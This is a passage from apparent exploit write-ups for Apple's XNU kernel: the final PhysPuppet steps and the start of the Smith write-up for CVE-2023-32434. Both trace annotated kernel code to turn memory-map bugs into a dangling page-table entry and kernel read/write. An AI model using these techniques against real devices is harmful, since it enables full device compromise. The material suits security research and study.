    vmr_flags_t             flags,      // flags := VM_MAP_REMOVE_NO_FLAGS
    kmem_guard_t            guard,      // guard := KMEM_GUARD_NONE
    vm_map_zap_t            zap_list)
{
    vm_map_entry_t          entry, next;
    int                     interruptible;
    vm_map_offset_t         gap_start = 0;
    vm_map_offset_t         clear_in_transition_end = 0;
    __unused vm_map_offset_t save_start = start;
    __unused vm_map_offset_t save_end = end;
    vm_map_delete_state_t   state = VMDS_NONE;
    kmem_return_t           ret = { };

    if (vm_map_pmap(map) == kernel_pmap) { // branch not taken
        ...
    }

    if (map->terminated || os_ref_get_count_raw(&map->map_refcnt) == 0) { // branch not taken
        ...
    }

    interruptible = (flags & VM_MAP_REMOVE_INTERRUPTIBLE) ?
        THREAD_ABORTSAFE : THREAD_UNINT; // interruptible := THREAD_UNINT

    if ((flags & VM_MAP_REMOVE_NO_MAP_ALIGN) == 0 &&
        (start & VM_MAP_PAGE_MASK(map))) { // branch not taken
        ...
    }

    if ((state & VMDS_GAPS_OK) == 0) { // branch taken
        if (end == 0 || end > vm_map_max(map)) { // branch not taken
            ...
        }

        if (end < start) { // branch not taken
            ...
        }

        if (start < vm_map_min(map)) { // branch not taken
            ...
        }
    } else { // branch not taken
        ...
    }

    // entry := vme2
    while (vm_map_lookup_entry_or_next(map, start, &entry)) {
        if (entry->superpage_size && (start & ~SUPERPAGE_MASK)) { // branch not taken
            ...
        } else { // branch taken
            SAVE_HINT_MAP_WRITE(map, entry->vme_prev);
            break;
        }
    }

    if (entry->superpage_size) { // branch not taken
        ...
    }

    for (vm_map_offset_t s = start; s < end;) { // s := A
        if (state & VMDS_NEEDS_LOOKUP) { // branch not taken
            ...
        }

        if (clear_in_transition_end) { // branch not taken
            ...
        }

        if (entry == vm_map_to_entry(map) || s < entry->vme_start) { // branch not taken
            ...
        }

        if (state & VMDS_KERNEL_PMAP) { // branch not taken
            ...
        }

        if (entry->vme_permanent && entry->is_sub_map) { // branch not taken
            ...
        }

        if (entry->vme_start < s) { // branch not taken
            ...
        }

        if (end < entry->vme_end) { // branch not taken
            ...
        }

        if (entry->vme_permanent && entry->is_sub_map) { // branch not taken
            ...
        }

        assert(s == entry->vme_start);
        assert(entry->vme_end <= end);

        if (entry->in_transition) { // branch not taken
            ...
        }

        if (entry->wired_count) { // branch not taken
            ...
        }

        assert(entry->wired_count == 0);
        assert(entry->user_wired_count == 0);

        if (!entry->vme_permanent) { // branch taken
            /*
             * Typical case: the entry really shouldn't be permanent
             */
        } else if ((flags & VM_MAP_REMOVE_IMMUTABLE_CODE) &&
            (entry->protection & VM_PROT_EXECUTE) &&
            developer_mode_state()) { // branch not taken
            ...
        } else if ((flags & VM_MAP_REMOVE_IMMUTABLE) || map->terminated) { // branch not taken
            ...
        } else { // branch not taken
            ...
        }

        if (entry->is_sub_map) { // branch not taken
            ...
        } else if (entry->vme_kernel_object ||
            VME_OBJECT(entry) == compressor_object) { // branch not taken
            ...
        } else if (map->mapped_in_other_pmaps &&
            os_ref_get_count_raw(&map->map_refcnt) != 0) { // branch not taken
            ...
        } else if ((VME_OBJECT(entry) != VM_OBJECT_NULL) ||
            (state & VMDS_KERNEL_PMAP)) { // branch taken
            /*
             * Note:
             * - pmap_remove_options() is responsible to clear the PTEs covered by this VME.
             */
            pmap_remove_options(map->pmap,  // current_pmap()
                (addr64_t)entry->vme_start, // A
                (addr64_t)entry->vme_end,   // A+1P+1
                PMAP_OPTIONS_REMOVE);
        }

        if (entry->iokit_acct) { // branch not taken
            ...
        }

        s = entry->vme_end; // s := A+1P+1
        next = entry->vme_next;
        ret.kmr_size += entry->vme_end - entry->vme_start;

        if (entry->vme_permanent) { // branch not taken
            ...
        } else { // branch taken
            /*
             * Note:
             * - vme2 is unlinked from the doubly-linked list and red-black tree here.
             */
            vm_map_entry_zap(map, entry, zap_list);
        }

        entry = next;

        ...

        /*
         * Note:
         * - The next VME is outside the unmapped VA range, so we will exit this loop.
         */
    }

    ...

    return ret;
}
```

In short, `pmap_remove_options()` is called for the VA range of `vme2`. Crucially, the end address
of `vme2` is unaligned at this point, but unfortunately, `pmap_remove_options()` only checks for
that condition inside the `MACH_ASSERT` macro for debug and development builds. Finally, the PPL
routine `pmap_remove_options_internal()` gets called, but the unaligned "page offset" of the end
address is shifted off, such that only the first of the two PTEs gets cleared, as shown in the
following snippet:

```c
// Location: osfmk/arm/pmap/pmap.c

MARK_AS_PMAP_TEXT vm_map_address_t
pmap_remove_options_internal(
    pmap_t pmap,            // pmap := current_pmap()
    vm_map_address_t start, // start := A
    vm_map_address_t end,   // end := A+1P+1
    int options)            // options := PMAP_OPTIONS_REMOVE
{
    vm_map_address_t eva = end; // eva := A+1P+1
    pt_entry_t     *bpte, *epte;
    pt_entry_t     *pte_p;
    tt_entry_t     *tte_p;
    int             remove_count = 0;
    bool            need_strong_sync = false;
    bool            unlock = true;

    if (__improbable(end < start)) { // branch not taken
        ...
    }

    validate_pmap_mutable(pmap);

    __unused const pt_attr_t * const pt_attr = pmap_get_pt_attr(pmap);

    pmap_lock(pmap, PMAP_LOCK_EXCLUSIVE);

    tte_p = pmap_tte(pmap, start); // tte_p := pointer to L2 TTE

    if (tte_p == (tt_entry_t *) NULL) { // branch not taken
        ...
    }

    if ((*tte_p & ARM_TTE_TYPE_MASK) == ARM_TTE_TYPE_TABLE) {
        pte_p = (pt_entry_t *) ttetokv(*tte_p); // pte_p := pointer to L3 TT
        bpte = &pte_p[pte_index(pt_attr, start)]; // bpte := pointer to first PTE
        epte = bpte + ((end - start) >> pt_attr_leaf_shift(pt_attr)); // epte := pointer to second PTE

        /*
         * Note:
         * - The difference of (end - start) is 1P+1, but becomes 1P after being shifted right,
         *   such that the end result is the same as if "end" had simply been A+1P.
         * - Therefore, only the first PTE for virtual address A gets removed.
         */

        if (__improbable((pmap->type != PMAP_TYPE_KERNEL) && (ptep_get_pmap(bpte) != pmap))) {
            ...
        }

        remove_count = pmap_remove_range_options(pmap, start, bpte, epte, &eva,
            &need_strong_sync, options);

        if ((pmap->type == PMAP_TYPE_USER) && (ptep_get_info(pte_p)->refcnt == 0)) {
            ...
        }
    }

done:
    if (unlock) {
        pmap_unlock(pmap, PMAP_LOCK_EXCLUSIVE);
    }

    if (remove_count > 0) {
        PMAP_UPDATE_TLBS(pmap, start, eva, need_strong_sync, true);
    }
    return eva;
}
```

Note that after `vm_map_delete()` returns, `vm_map_remove_and_unlock()` will also call
`vm_map_zap_dispose()`, which will deallocate `vme2` and drop the reference count of `vmo1` to 1.

Here is an illustration of the relevant kernel state after step 4:

![physpuppet-figure4.png](figures/physpuppet-figure4.png)

#### STEP 5:

In this step, we call `mach_port_deallocate()` to deallocate the port returned in step 1, namely for
`vmne1`. This will cause the deallocation of all structures associated with the named entry.
However, since it was holding the last reference on `vmo1`, this will trigger `vm_object_reap()`,
which will put both of its pages, `vmp1` and `vmp2`, back on the free list without calling
`pmap_disconnect()`. However, we still have a dangling PTE on the physical page referred to by
`vmp2`, with both read and write permissions.

Here is an illustration of the relevant kernel state after step 5:

![physpuppet-figure5.png](figures/physpuppet-figure5.png)

#### STEP 6:

Great, we have successfully achieved a PUAF primitive. However, if the rest of the exploit goes
wrong and our process suddenly exits, we would get a "Found inconsistent state in soon to be deleted
L%d table" kernel panic. That is because there is now a discrepancy between the state of our VM map
and the state of our pmap. Indeed, we have a PTE for the virtual address A + 1P in the pmap, but
there is no corresponding VME in our VM map. In that case, when the process exits, PPL rightfully
detects that this is abnormal and chooses death over dishonor. In order to prevent that, we can
simply call `vm_allocate()` to create another VME (`vme3`) that covers the VA range of both original
PTEs. However, it is important to initialize `VME_OBJECT(vme3)` to a non-null value, otherwise
`pmap_remove_options()` won't get called when `vme3` is deleted, as can be seen from the snippet for
`vm_map_delete()` shown previously. This is easily achieved by faulting in the first page of `vme3`,
which will allocate a new object (`vmo2`), populate it with a new zero-filled page (`vmp3`), and
enter the physical address of that page into the PTE for virtual address A. Of course, we don't want
to fault in the second page, which would overwrite the dangling PTE.

Here is an illustration of the relevant kernel state after step 6:

![physpuppet-figure6.png](figures/physpuppet-figure6.png)

And voilÃ ! We now have a stable PUAF primitive on a single physical page. We can then repeat this
entire procedure as many times as necessary in order to obtain an arbitrary number of PUAF pages.

---

## Part B: From PUAF to KRKW

This part of the exploit is shared across all PUAF exploits, so please check the write-up about
[exploiting PUAFs](exploiting-puafs.md) for more details.

---

## Part C: From KRKW to Cleanup

This exploit does not corrupt the kernel state such that it needs to be cleaned up post-KRKW in
order to prevent a kernel panic.

```

`writeups/smith.md`:

```md
# Smith

> I don't fully understand how it happened, perhaps some part of you imprinted on to me.           \
> Something overwritten or copied. It is at this point irrelevant.                                 \
> What matters is that whatever happened, happened for a reason.

Agent Smith - The Matrix Reloaded

---

## Abbreviations

- KRKW: kernel read/write
- PUAF: physical use-after-free
- VMC: `vm_map_copy` structure
- VME: `vm_map_entry` structure
- VMO: `vm_object` structure

---

## Table of Contents

- [Introduction](#introduction)
- [Part A: From Vulnerability to PUAF](#part-a-from-vulnerability-to-puaf)
- [Part B: From PUAF to KRKW](#part-b-from-puaf-to-krkw)
- [Part C: From KRKW to Cleanup](#part-c-from-krkw-to-cleanup)
- [Appendix A: Considerations for Setup](#appendix-a-considerations-for-setup)
- [Appendix B: Hacky Proof of Determinism](#appendix-b-hacky-proof-of-determinism)

---

## Introduction

This write-up presents an exploit for a vulnerability in the XNU kernel:

- Assigned [CVE-2023-32434][1].
- Fixed in iOS 16.5.1 and macOS 13.4.1.
- Reachable from the WebContent sandbox and might have been actively exploited.
- Note that this CVE fixed multiple integer overflows, so it is unclear whether or not the integer
  overflow used in my exploit was also used in-the-wild. Moreover, if it was, it might not have been
  exploited in the same way.

The exploit has been successfully tested on:

- iOS 16.3, 16.3.1, 16.4 and 16.5 (iPhone 14 Pro Max)
- macOS 13.1 and 13.4 (MacBook Air M2 2022)

All code snippets shown below are from [xnu-8792.81.2][2].

[1]: https://support.apple.com/en-us/HT213814
[2]: https://github.com/apple-oss-distributions/xnu/tree/xnu-8792.81.2

---

## Part A: From Vulnerability to PUAF

This part of the exploit is made up of 5 steps, which are labeled in the function `smith_run()`,
located in [smith.h](../kfd/libkfd/puaf/smith.h). Each step will be described in detail, but first,
here is an illustration of the relevant kernel state after each step. Note that the green boxes
represent VMEs, the yellow boxes represent VMOs, and the red text highlights the difference compared
to the previous step.

Also, please note:

- Before reading the description for each step, check the corresponding code in the function
  `smith_run()`, as it won't be repeated here.
- After reading the description for each step, come back to this image to make sure it matches your
  understanding of the kernel state.

![smith-figure1.png](figures/smith-figure1.png)

#### STEP 1:

This step happens before we trigger the vulnerability in step 2 and is partially responsible for the
setup. Please note that the rest of the setup, which focuses strictly on reliability, is discussed
at length in [Appendix A](#appendix-a-considerations-for-setup). Here, we simply allocate 5
adjacent VMEs, referred to as `vme0` to `vme4` in the image above, with the following attributes:

- The size of `vme0` and `vme2` is 1 page.
- The size of `vme1` is X pages, where X is the desired number of PUAF pages and must be at least 2.
- The size of `vme3` is equal to the size of `vme1` and `vme2`, i.e. (X+1) pages.
- The size of `vme4` is equal to the size of `vme0` and `vme3`, i.e. (X+2) pages.
- The first 3 VMEs are allocated in decreasing address order to avoid `vm_object_coalesce()` in
  `vm_map_enter()`.
- The last 2 VMEs are initialized to own a VMO with a `copy_strategy` of `MEMORY_OBJECT_COPY_NONE`,
  by using the flag `VM_FLAGS_PURGABLE`.

Optionally, we could also fault in the VA range of `vme3` and `vme4`, in order to pre-populate
`vmo0` and `vmo1`, respectively. This isn't necessary, but it would slightly reduce the duration of
the critical section by avoiding the need to zero-fill (2X+3) pages during step 3 and step 5.

#### STEP 2:

At a high-level, this step is made up of 2 substeps. In substep 2A, we trigger the vulnerability in
`vm_map_copyin_internal()`, which will clip the end of `vme2` to 0, and also allocate another VME
(i.e. `vme2a`) that starts at 0. However, at this point, `vm_map_copyin_internal()` would enter an
infinite loop that keeps allocating VMEs until it reaches a zone exhaustion panic. Therefore, before
calling `vm_copy()`, we spawn 4 threads that call `vm_protect()` at address 0 in a busy-loop. These
threads won't do anything until the vulnerability is triggered in the main thread. In substep 2B,
after `vme2a` has been inserted into our VM map, one of those 4 threads will clip the end of `vme2a`
to 1P (i.e. `PAGE_SIZE`), change its `protection` to `VM_PROT_WRITE`, and also allocate yet another
VME (i.e. `vme2b`) that starts at 1P. Meanwhile, back in the main thread, `vm_map_copyin_internal()`
will take back the map lock and lookup `vme2a` at address 0. But because its new `protection` is
missing `VM_PROT_READ`, it will exit with `KERN_PROTECTION_FAILURE`.

Here is the detailed description of the code path in `vm_map_copyin_internal()`, which is called by
`vm_copy()` from the main thread:

```c
kern_return_t
vm_map_copyin_internal(
    vm_map_t         src_map,  // src_map == current_map()
    vm_map_address_t src_addr, // src_addr == C
    vm_map_size_t    len,      // len == (0ULL-C-1)
    int              flags,    // flags == 0
    vm_map_copy_t    *copy_result)
{
    vm_map_entry_t   tmp_entry;
    vm_map_entry_t   new_entry = VM_MAP_ENTRY_NULL;
    vm_map_offset_t  src_start;
    vm_map_offset_t  src_end;
    vm_map_offset_t  src_base;
    vm_map_t         base_map = src_map;
    boolean_t        map_share = FALSE;
    submap_map_t     *parent_maps = NULL;
    vm_map_copy_t    copy;
    vm_map_address_t copy_addr;
    vm_map_size_t    copy_size;
    boolean_t        src_destroy;
    boolean_t        use_maxprot;
    boolean_t        preserve_purgeable;
    boolean_t        entry_was_shared;
    vm_map_entry_t   saved_src_entry;

    if (flags & ~VM_MAP_COPYIN_ALL_FLAGS) { // branch not taken
        ...
    }

    src_destroy = (flags & VM_MAP_COPYIN_SRC_DESTROY) ? TRUE : FALSE; // src_destroy := FALSE
    use_maxprot = (flags & VM_MAP_COPYIN_USE_MAXPROT) ? TRUE : FALSE; // use_maxprot := FALSE
    preserve_purgeable = (flags & VM_MAP_COPYIN_PRESERVE_PURGEABLE) ? TRUE : FALSE; // preserve_purgeable := FALSE

    if (len == 0) { // branch not taken
        ...
    }

    src_end = src_addr + len; // src_end := (0ULL-1)
    if (src_end < src_addr) { // branch not taken, because no overflow occured at this point
        ...
    }

    /*
     * (0)
     * @note:
     * This trigger the integer overflow that can be considered the "root cause" vulnerability.
     */
    src_start = vm_map_trunc_page(src_addr, VM_MAP_PAGE_MASK(src_map)); // src_start := C
    src_end = vm_map_round_page(src_end, VM_MAP_PAGE_MASK(src_map)); // src_end := 0

    if ((len <= msg_ool_size_small) &&
        (!use_maxprot) &&
        (!preserve_purgeable) &&
        (!(flags & VM_MAP_COPYIN_ENTRY_LIST)) &&
        ((src_start >= vm_map_min(src_map)) &&
         (src_start < vm_map_max(src_map)) &&
         (src_end >= vm_map_min(src_map)) &&
         (src_end < vm_map_max(src_map)))) { // branch not taken, because (len > msg_ool_size_small)
        ...
    }

    copy = vm_map_copy_allocate();
    copy->type = VM_MAP_COPY_ENTRY_LIST;
    copy->cpy_hdr.entries_pageable = TRUE;
    copy->cpy_hdr.page_shift = (uint16_t)(VM_MAP_PAGE_SHIFT(src_map));
    vm_map_store_init(&(copy->cpy_hdr));
    copy->offset = src_addr;
    copy->size = len;

    /*
     * (1)
     * @note:
     * Here, new_entry is initialized with a temporary VME, so it's not NULL.
     */
    new_entry = vm_map_copy_entry_create(copy);

    ...

    vm_map_lock(src_map); // take the map lock

    if (!vm_map_lookup_entry(src_map, src_addr, &tmp_entry)) { // branch not taken, tmp_entry := vme2
        ...
    }

    if (!tmp_entry->is_sub_map) { // branch taken
        vm_map_clip_start(src_map, tmp_entry, src_start); // no clipping because (src_start == tmp_entry->vme_start)
    }

    if (src_start < tmp_entry->vme_start) { // branch not taken, because (src_start == tmp_entry->vme_start)
        ...
    }

    copy_addr = src_start; // copy_addr := C

    while (TRUE) {
        vm_map_entry_t     src_entry = tmp_entry; // src_entry := vme2 (1st iteration); src_entry := vme2a (2nd iteration)
        vm_map_size_t      src_size;
        vm_object_t        src_object;
        vm_object_offset_t src_offset;
        vm_object_t        new_copy_object;
        boolean_t          src_needs_copy;
        boolean_t          new_entry_needs_copy;
        boolean_t          was_wired;
        boolean_t          saved_used_for_jit;
        vm_map_version_t   version;
        kern_return_t      result;

        while (tmp_entry->is_sub_map) { // branch not taken
            ...
        }

        if ((VME_OBJECT(tmp_entry) != VM_OBJECT_NULL) &&
            (VME_OBJECT(tmp_entry)->phys_contiguous)) { // branch not taken
            ...
        }

        /*
         * (2)
         * @note:
         * For the 1st iteration, new_entry is not NULL because it was initialized at (1).
         *
         * (6)
         * @note:
         * For the 2nd iteration, new_entry is NULL because it was updated at (5).
         */
        if (new_entry == VM_MAP_ENTRY_NULL) { // branch not taken for the 1st iteration, but taken for the 2nd iteration
            version.main_timestamp = src_map->timestamp;
            vm_map_unlock(src_map); // release the map lock
            new_entry = vm_map_copy_entry_create(copy);
            vm_map_lock(src_map); // take back the map lock

            /*
             * (7)
             * @note:
             * This timestamp comparison fails because one or more of the 4 spinner threads will have taken the map lock.
             * Also, note that src_start is no longer equal to C, but is now equal to 0 because it was updated at (5).
             */
            if ((version.main_timestamp + 1) != (src_map->timestamp)) { // branch taken
                if (!vm_map_lookup_entry(src_map, src_start, &tmp_entry)) { // branch not taken, tmp_entry := vme2a
                    ...
                }
                if (!tmp_entry->is_sub_map) { // branch taken
                    vm_map_clip_start(src_map, tmp_entry, src_start); // no clipping because (src_start == tmp_entry->vme_start)
                }
                continue;
            }
        }

        /*
         * (3)
         * @note:
         * For the 1st iteration, vme2->protection == VM_PROT_DEFAULT, so the check succeeds.
         *
         * (8)
         * @note:
         * For the 2nd iteration, vme2a->protection == VM_PROT_WRITE, so the check fails.
         * Finally, vm_map_copyin_internal() returns KERN_PROTECTION_FAILURE.
         */
        if ((((src_entry->protection & VM_PROT_READ) == VM_PROT_NONE) && (!use_maxprot)) ||
            ((src_entry->max_protection & VM_PROT_READ) == 0)) { // branch not taken for the 1st iteration, but taken for the 2nd iteration
            RETURN(KERN_PROTECTION_FAILURE);
        }

        /*
         * (4)
         * @note:
         * This clips the end of vme2 to 0, which now has a VA range of [C,0).
         * This also allocates and inserts vme2a, which has a VA range of [0,D).
         */
        vm_map_clip_end(src_map, src_entry, src_end);

        src_size = src_entry->vme_end - src_start; // src_size := (0ULL-C)
        src_object = VME_OBJECT(src_entry); // src_object := NULL
        src_offset = VME_OFFSET(src_entry); // src_offset := 0
        was_wired = (src_entry->wired_count != 0); // was_wired := FALSE

        vm_map_entry_copy(src_map, new_entry, src_entry);

        if (new_entry->is_sub_map) { // branch not taken
            ...
        } else { // branch taken
            ...
            assert(!new_entry->iokit_acct);
            new_entry->use_pmap = TRUE;
        }

RestartCopy:
        if (((src_object == VM_OBJECT_NULL) ||
             ((!was_wired) &&
              (!map_share )&&
              (!tmp_entry->is_shared) &&
              (!((debug4k_no_cow_copyin) && (VM_MAP_PAGE_SHIFT(src_map) < PAGE_SHIFT))))) &&
            (vm_object_copy_quickly(VME_OBJECT(new_entry), src_offset, src_size, &src_needs_copy, &new_entry_needs_copy))) { // branch taken
            new_entry->needs_copy = new_entry_needs_copy;

            if ((src_needs_copy) && (!tmp_entry->needs_copy)) { // branch not taken, because (src_needs_copy == FALSE)
                ...
            }

            goto CopySuccessful;
        }

        ...

CopySuccessful:
        vm_map_copy_entry_link(copy, vm_map_copy_last_entry(copy), new_entry);

        /*
         * (5)
         * @note:
         * Here, src_start is updated to 0 and new_entry is updated to NULL.
         */
        src_base = src_start; // src_base := C
        src_start = new_entry->vme_end; // src_start := 0
        new_entry = VM_MAP_ENTRY_NULL;

        while ((src_start >= src_end) && (src_end != 0)) { // branch not taken, because (src_end == 0)
            ...
        }

        if ((VM_MAP_PAGE_SHIFT(src_map) != PAGE_SHIFT) &&
            (src_start >= src_addr + len) &&
            (src_addr + len != 0)) { // branch not taken
            ...
        }

        if ((src_start >= src_end) && (src_end != 0)) { // branch not taken, because (src_end == 0)
            ...
        }

        tmp_entry = src_entry->vme_next; // tmp_entry := vme2a

        if ((tmp_entry->vme_start != src_start) ||
            (tmp_entry == vm_map_to_entry(src_map))) { // branch not taken... so go back to the top of the while loop
            ...
        }
    }

    ...
}
```

And here is the detailed description of the code path in `vm_map_protect()`, which is called by
`vm_protect()` from the 4 spinner threads:

```c
kern_return_t
vm_map_protect(
    vm_map_t        map,      // map == current_map()
    vm_map_offset_t start,    // start == 0
    vm_map_offset_t end,      // end == 1P
    vm_prot_t       new_prot, // new_prot == VM_PROT_WRITE
    boolean_t       set_max)  // set_max == FALSE
{
    vm_map_entry_t  current;
    vm_map_offset_t prev;
    vm_map_entry_t  entry;
    vm_prot_t       new_max;
    int             pmap_options = 0;
    kern_return_t   kr;

    if (new_prot & VM_PROT_COPY) { // branch not taken
        ...
    }

    vm_map_lock(map); // take the map lock

    if (start >= map->max_offset) { // branch not taken
        ...
    }

    while (1) {
        /*
         * (0)
         * @note:
         * Before the main thread triggers the vulnerability in vm_map_copyin_internal(),
         * this lookup at address 0 fails and vm_map_protect() returns KERN_INVALID_ADDRESS.
         * However, after the bad clip, the lookup succeeds and entry := vme2a, which has a VA range of [0,D).
         */
        if (!vm_map_lookup_entry(map, start, &entry)) { // branch taken before bad clip, but not taken after
            vm_map_unlock(map);
            return KERN_INVALID_ADDRESS;
        }

        if ((entry->superpage_size) && (start & (SUPERPAGE_SIZE - 1))) { // branch not taken
            ...
        }

        break;
    }

    if (entry->superpage_size) { // branch not taken
        ...
    }

    current = entry; // current := vme2a
    prev = current->vme_start; // prev := 0

    while ((current != vm_map_to_entry(map)) && (current->vme_start < end)) { // branch taken (1 iteration)
        if (current->vme_start != prev) { // branch not taken
            ...
        }

        new_max = current->max_protection; // new_max := VM_PROT_ALL

        if ((new_prot & new_max) != new_prot) { // branch not taken
            ...
        }

        if ((current->used_for_jit) &&
            (pmap_has_prot_policy(map->pmap, current->translated_allow_execute, current->protection))) { // branch not taken
            ...
        }

        if (current->used_for_tpro) { // branch not taken
            ...
        }


        if ((new_prot & VM_PROT_WRITE) &&
            (new_prot & VM_PROT_ALLEXEC) &&
            ...
            (!(current->used_for_jit))) { // branch not taken
            ...
        }

        if (map->map_disallow_new_exec == TRUE) { // branch not taken
            ...
        }

        prev = current->vme_end; // prev := D
        current = current->vme_next; // current := vme3, which has a VA range of [D,E)... so exit the while loop
    }

    if ((end > prev) &&
        (end == vm_map_round_page(prev, VM_MAP_PAGE_MASK(map)))) { // branch not taken, because (end < prev)
        ...
    }

    if (end > prev) { // branch not taken, because (end < prev)
        ...
    }

    current = entry; // current := vme2a

    if (current != vm_map_to_entry(map)) { // branch taken
        vm_map_clip_start(map, current, start); // no clipping because (start == current->vme_start)
    }

    while ((current != vm_map_to_entry(map)) && (current->vme_start < end)) { // branch taken (1 iteration)
        vm_prot_t old_prot;

        /*
         * (1)
         * @note:
         * This clips the end of vme2a to 1P, which now has a VA range of [0,1P).
         * This also allocates and inserts vme2b, which has a VA range of [1P,D).
         */
        vm_map_clip_end(map, current, end);

        if (current->is_sub_map) { // branch not taken
            ...
        }

        old_prot = current->protection; // old_prot := VM_PROT_DEFAULT

        if (set_max) { // branch not taken
            ...
        } else {
            current->protection = new_prot; // vme2a->protection := VM_PROT_WRITE
        }

        if (current->protection != old_prot) { // branch taken
            vm_prot_t prot;

            prot = current->protection; // prot := VM_PROT_WRITE
            if ((current->is_sub_map) ||
                (VME_OBJECT(current) == NULL) ||
                (VME_OBJECT(current) != compressor_object)) { // branch taken
                prot &= ~VM_PROT_WRITE; // prot := VM_PROT_NONE
            } else {
                ...
            }

            if (override_nx(map, VME_ALIAS(current)) && (prot)) { // branch not taken
                ...
            }

            if (pmap_has_prot_policy(map->pmap, current->translated_allow_execute, prot)) { // branch not taken
                ...
            }

            if ((current->is_sub_map) && (current->use_pmap)) { // branch not taken
                ...
            } else {
                /*
                 * (2)
                 * @note:
                 * This calls pmap_protect_options() in the VA range [0,1P) with prot == VM_PROT_NONE, which does nothing.
                 *
                 * [STEP 4]
                 * @note
                 * When we restore the protection to VM_PROT_DEFAULT in STEP 4, it will call
                 * pmap_protect_options() in the VA range [0,1P) with prot == VM_PROT_READ, which also does nothing.
                 */
                pmap_protect_options(map->pmap, current->vme_start, current->vme_end, prot, pmap_options, NULL);
            }
        }

        current = current->vme_next; // current := vme2b, which has a VA range of [1P,D)... so exit the while loop
    }

    current = entry; // current := vme2a

    while ((current != vm_map_to_entry(map)) && (current->vme_start <= end)) { // branch taken (2 iterations)
        vm_map_simplify_entry(map, current); // no simplifying, because of different protections
        current = current->vme_next; // current := vme2b for 1st iteration (VA range is [1P,D) so continue); current := vme3 for the 2nd iteration (VA range is [D,E) so break)
    }

    vm_map_unlock(map); // release the map lock
    return KERN_SUCCESS;
}
```

#### STEP 3:

At a high-level, this step makes a copy of (X+1) pages from `vme3`, which are first populated and
zero-filled into `vmo0`, and then inserts them starting at `vme1`. Note that since `vmo0` has a
`copy_strategy` of `MEMORY_OBJECT_COPY_NONE`, no copy-on-write optimization is applied during the
`vm_map_copyin()` part of the `vm_copy()`. Instead, a new VMO (i.e. `vmo2`) is allocated to hold the
(X+1) copied pages in `vm_object_copy_slowly()`. When `vm_map_copyin()` returns, the VMC contains a
single VME which owns the only reference to `vmo2` at that point. Then, `vm_copy()` calls
`vm_map_copy_overwrite()`, which in turn calls `vm_map_copy_overwrite_nested()`, which finally calls
`vm_map_copy_overwrite_aligned()`. This is where `vmo2` is moved out of the temporary VMC and
becomes shared between `vme1` and `vme2`, as shown in the image above. When `vm_copy()` returns,
`vmo2` contains (X+1) resident pages but none of them have been pmapped. So, we then call `memset()`
to enter the physical address of the first X pages of `vmo2` into the PTEs in the VA range of [B,C).

Here is the detailed description of the code path in `vm_map_copy_overwrite_aligned()`:

```c
static kern_return_t
vm_map_copy_overwrite_aligned(
    vm_map_t        dst_map,   // dst_map == current_map()
    vm_map_entry_t  tmp_entry, // tmp_entry == vme1
    vm_map_copy_t   copy,      // copy == temporary vm_map_copy structure with a single VME that owns vmo2
    vm_map_offset_t start,     // start == B
    __unused pmap_t pmap)
{
    vm_object_t    object;
    vm_map_entry_t copy_entry;
    vm_map_size_t  copy_size;
    vm_map_size_t  size;
    vm_map_entry_t entry;

    /*
     * (0)
     * @note:
     * Although the copy has a single VME initially, it will soon be clipped, which will create and
     * insert a second VME into the copy. Therefore, there will be 2 iterations of this while loop.
     */
    while ((copy_entry = vm_map_copy_first_entry(copy)) != vm_map_copy_to_entry(copy)) {
        /*
         * (1)
         * @note:
         * 1st iteration: copy_size := (X+1)P
         * 2nd iteration: copy_size := 1P
         */
        copy_size = (copy_entry->vme_end - copy_entry->vme_start);

        /*
         * (2)
         * @note:
         * 1st iteration: entry := vme1, with a VA range of [B,C)
         * 2nd iteration: entry := vme2, with a VA range of [C,0)
         */
        entry = tmp_entry;

        if (entry->is_sub_map) { // branch not taken
            ...
        }

        if (entry == vm_map_to_entry(dst_map)) { // branch not taken
            ...
        }

        /*
         * (3)
         * @note:
         * 1st iteration: size := XP
         * 2nd iteration: size := (0ULL-C)
         */
        size = (entry->vme_end - entry->vme_start);

        if ((entry->vme_start != start) || ((entry->is_sub_map) && !entry->needs_copy)) { // branch not taken
            ...
        }

        assert(entry != vm_map_to_entry(dst_map));

        if (!(entry->protection & VM_PROT_WRITE)) { // branch not taken
            ...
        }

        if (!vm_map_entry_is_overwritable(dst_map, entry)) { // branch not taken
            ...
        }

        if (copy_size < size) { // branch taken only for 2nd iteration
            if (entry->map_aligned &&
                !VM_MAP_PAGE_ALIGNED(entry->vme_start + copy_size, VM_MAP_PAGE_MASK(dst_map))) {  // branch not taken
                ...
            }

            /*
             * (4b)
             * @note:
             * No clipping because entry->vme_start + copy_size is greater than entry->vme_end (C+1P > 0).
             */
            vm_map_clip_end(dst_map, entry, entry->vme_start + copy_size);
            size = copy_size; // size = 1P
        }

        if (size < copy_size) { // branch taken only for 1st iteration
            /*
             * (4a)
             * @note:
             * Here, the single VME with a size of (X+1)P in the copy is split into two VMEs.
             * The first one has a size of XP, and the second one has a size of 1P.
             */
            vm_map_copy_clip_end(copy, copy_entry, copy_entry->vme_start + size);
            copy_size = size; // copy_size = XP
        }

        assert((entry->vme_end - entry->vme_start) == size);
        assert((tmp_entry->vme_end - tmp_entry->vme_start) == size);
        assert((copy_entry->vme_end - copy_entry->vme_start) == size);

        object = VME_OBJECT(entry); // object := NULL for both iterations

        if (((!entry->is_shared) &&
             ((object == VM_OBJECT_NULL) || (object->internal && !object->true_share))) ||
            (entry->needs_copy)) { // branch taken for both iterations
            vm_object_t        old_object = VME_OBJECT(entry); // old_object := NULL for both iterations
            vm_object_offset_t old_offset = VME_OFFSET(entry); // old_offset := 0 for both iterations
            vm_object_offset_t offset;

            if ((old_object == VME_OBJECT(copy_entry)) &&
                (old_offset == VME_OFFSET(copy_entry))) { // branch not taken
                ...
            }

            if ((dst_map->pmap != kernel_pmap) &&
                (VME_ALIAS(entry) >= VM_MEMORY_MALLOC) &&
                (VME_ALIAS(entry) <= VM_MEMORY_MALLOC_MEDIUM)) { // branch not taken
                ...
            }

            /*
             * [STEP 5] --> Only read this when you are at STEP 5, otherwise skip this branch.
             * @note:
             * This branch is not taken for both iterations in STEP 3.
             * However, in STEP 5, we also call vm_copy() to repeat the same process,
             * but that time, old_object will be vmo2 during the 2nd iteration.
             */
            if (old_object != VM_OBJECT_NULL) { // branch not taken for STEP 3, but taken for the 2nd iteration of STEP 5
                assert(!entry->vme_permanent);
                if (entry->is_sub_map) {
                    ...
                } else {
                    if (dst_map->mapped_in_other_pmaps) {
                        ...
                    } else {
                        /*
                         * [STEP 5]
                         * @note:
                         * During the 2nd iteration of STEP 5, entry == vme2, which has a VA range of [B,0) at that point.
                         * Therefore, we call pmap_remove_options() on the VA range of [B,0),
